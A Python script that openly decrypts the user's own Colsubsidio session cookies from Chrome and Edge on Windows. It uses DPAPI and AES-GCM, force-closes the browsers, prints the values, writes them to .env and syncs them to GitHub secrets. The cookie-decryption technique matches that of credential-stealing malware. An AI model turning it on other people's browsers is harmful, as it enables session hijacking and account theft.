"""Script para extraer automáticamente las cookies de Colsubsidio de Chrome/Edge en Windows."""
import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import ctypes
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char))
    ]

def decrypt_key_with_dpapi(encrypted_key: bytes) -> bytes:
    """Desencripta la clave maestra de Chrome/Edge usando DPAPI de Windows."""
    if encrypted_key.startswith(b"DPAPI"):
        encrypted_key = encrypted_key[5:]

    crypt32 = ctypes.windll.crypt32
    in_blob = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_char)))
    out_blob = DATA_BLOB()

    success = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(out_blob)
    )
    if not success:
        raise OSError("CryptUnprotectData failed. Asegúrate de estar ejecutando el script en la misma cuenta de usuario de Windows.")

    decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return decrypted

def decrypt_cookie_value(encrypted_value: bytes, master_key: bytes) -> str:
    """Desencripta el valor de una cookie usando la clave maestra de AES."""
    try:
        if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11"):
            iv = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            aesgcm = AESGCM(master_key)
            decrypted = aesgcm.decrypt(iv, ciphertext, None)
            return decrypted.decode("utf-8")
        return encrypted_value.decode("utf-8")
    except Exception as e:
        return ""

def get_browser_paths() -> list[dict]:
    """Retorna los directorios de datos de Chrome y Edge en Windows."""
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    if not local_app_data:
        return []

    return [
        {
            "name": "Google Chrome",
            "user_data_path": os.path.join(local_app_data, "Google", "Chrome", "User Data"),
            "local_state_path": os.path.join(local_app_data, "Google", "Chrome", "User Data", "Local State")
        },
        {
            "name": "Microsoft Edge",
            "user_data_path": os.path.join(local_app_data, "Microsoft", "Edge", "User Data"),
            "local_state_path": os.path.join(local_app_data, "Microsoft", "Edge", "User Data", "Local State")
        }
    ]

def find_cookie_databases(user_data_path: str) -> list[str]:
    """Escanea el directorio de usuario buscando archivos de base de datos de cookies."""
    databases = []
    # Buscar en Default y perfiles alternativos (Profile 1, Profile 2, etc.)
    if not os.path.exists(user_data_path):
        return []

    for root, dirs, files in os.walk(user_data_path):
        # Evitar buscar en directorios temporales de restauración o cachés gigantes
        if "Cache" in root or "System Profile" in root:
            continue
        for file in files:
            if file == "Cookies":
                # Asegurarse que esté en una subcarpeta Network
                if root.endswith("Network") or "Network" in root:
                    databases.append(os.path.join(root, file))
    return databases

def extract_colsubsidio_cookies() -> dict[str, str]:
    """Extrae las cookies sistema y Csrf-Token de Chrome y Edge en Windows."""
    extracted = {}
    
    for browser in get_browser_paths():
        if not os.path.exists(browser["local_state_path"]):
            continue

        print(f"Buscando cookies en {browser['name']}...")
        
        # 1. Cargar clave maestra
        try:
            with open(browser["local_state_path"], "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key_b64)
            master_key = decrypt_key_with_dpapi(encrypted_key)
        except Exception as e:
            print(f"  No se pudo leer la clave maestra de {browser['name']}: {e}")
            continue

        # 2. Buscar bases de datos de cookies
        cookie_dbs = find_cookie_databases(browser["user_data_path"])
        for db_path in cookie_dbs:
            # Para evitar bloqueos si el navegador está abierto, copiamos a un archivo temporal
            temp_db = tempfile.mktemp(suffix=".sqlite")
            try:
                shutil.copyfile(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Buscar cookies de Colsubsidio
                cursor.execute(
                    "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%diversioncolsubsidio.com'"
                )
                
                for name, encrypted_value in cursor.fetchall():
                    decrypted = decrypt_cookie_value(encrypted_value, master_key)
                    if decrypted:
                        if name == "sistema":
                            extracted["sistema"] = decrypted
                        elif name == "Csrf-Token":
                            extracted["Csrf-Token"] = decrypted
                            
                conn.close()
            except PermissionError:
                print(f"  [Error] No se pudo acceder a {db_path} porque está bloqueado por el navegador.")
                print("  Por favor, cierra el navegador por completo para desbloquearlo.")
            except Exception as e:
                print(f"  [Aviso] No se pudo leer {db_path}: {e}")
            finally:
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except Exception:
                        pass
            
            # Si ya encontramos ambas cookies, no hace falta seguir buscando
            if "sistema" in extracted and "Csrf-Token" in extracted:
                print(f"  Cookies encontradas con exito en {browser['name']}!")
                return extracted

    return extracted

def update_env_file(cookies: dict[str, str]) -> bool:
    """Actualiza el archivo .env local con los nuevos valores de cookies."""
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), ".env")
    if not os.path.exists(env_path):
        print("Error: No se encontró el archivo .env en la raíz del proyecto.")
        return False

    try:
        # Leer líneas del .env actual
        with open(env_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        new_lines = []
        updated_sistema = False
        updated_csrf = False

        for line in lines:
            stripped = line.strip()
            if stripped.startswith("COLSUBSIDIO_SISTEMA_COOKIE="):
                new_lines.append(f"COLSUBSIDIO_SISTEMA_COOKIE={cookies['sistema']}\n")
                updated_sistema = True
            elif stripped.startswith("COLSUBSIDIO_CSRF_TOKEN="):
                new_lines.append(f"COLSUBSIDIO_CSRF_TOKEN={cookies['Csrf-Token']}\n")
                updated_csrf = True
            else:
                new_lines.append(line)

        # Si no existían en el archivo, las agregamos al final
        if not updated_sistema:
            new_lines.append(f"COLSUBSIDIO_SISTEMA_COOKIE={cookies['sistema']}\n")
        if not updated_csrf:
            new_lines.append(f"COLSUBSIDIO_CSRF_TOKEN={cookies['Csrf-Token']}\n")

        with open(env_path, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

        return True
    except Exception as e:
        print(f"Error al escribir en .env: {e}")
        return False

def sync_secrets_to_github(cookies: dict[str, str]) -> bool:
    """Intenta sincronizar los secretos de GitHub usando la herramienta oficial gh CLI."""
    import subprocess
    try:
        # Verificar si gh CLI está instalado y autenticado
        result = subprocess.run(["gh", "auth", "status"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            # gh no está instalado o no está autenticado
            return False

        print("\nSincronizando cookies con los secretos de GitHub usando gh CLI...")
        
        # Actualizar COLSUBSIDIO_SISTEMA_COOKIE
        subprocess.run(
            ["gh", "secret", "set", "COLSUBSIDIO_SISTEMA_COOKIE", "--body", cookies["sistema"]],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
        )
        
        # Actualizar COLSUBSIDIO_CSRF_TOKEN
        subprocess.run(
            ["gh", "secret", "set", "COLSUBSIDIO_CSRF_TOKEN", "--body", cookies["Csrf-Token"]],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
        )
        
        print("Sincronizacion de secretos en GitHub completada con exito.")
        return True
    except Exception as e:
        print(f"No se pudieron sincronizar las cookies en GitHub: {e}")
        return False

def main():
    if sys.platform != "win32":
        print("Este script extractor automatizado solo funciona en sistemas operativos Windows.")
        sys.exit(1)

    print("=== Extractor Automatizado de Cookies de Colsubsidio ===")
    
    # Liberar archivos de cookies cerrando procesos en segundo plano
    print("Liberando archivos de cookies (cerrando procesos Edge/Chrome)...")
    import subprocess
    subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    cookies = extract_colsubsidio_cookies()

    if "sistema" in cookies and "Csrf-Token" in cookies:
        print("\n[RESULTADOS ENCONTRADOS]")
        print(f"sistema: {cookies['sistema']}")
        print(f"Csrf-Token: {cookies['Csrf-Token']}")
        
        if update_env_file(cookies):
            print("\n[OK] El archivo .env local ha sido actualizado automaticamente con los nuevos valores.")
            print("Ya puedes ejecutar el Revisor localmente y usará estas cookies.")
        else:
            print("\n[WARNING] Las cookies se extrajeron pero no se pudo actualizar el archivo .env.")

        # Intentar sincronizar con GitHub
        if not sync_secrets_to_github(cookies):
            print("\n[INFO] Sincronizacion automatica con GitHub omitida (gh CLI no instalado o no autenticado).")
            print("Si deseas subir las cookies a GitHub de forma automatica sin entrar a la web:")
            print("1. Instala GitHub CLI desde: https://cli.github.com/")
            print("2. Abre una consola y ejecuta: gh auth login")
            print("3. La proxima vez, este script actualizara GitHub de forma automatica al hacer doble clic.")
    else:
        print("\n[ERROR] No se encontraron cookies activas de diversioncolsubsidio.com en Chrome ni Edge.")
        print("Por favor, asegúrese de iniciar sesión en la tienda de diversion en su navegador antes de ejecutar este script.")
        sys.exit(1)

if __name__ == "__main__":
    main()
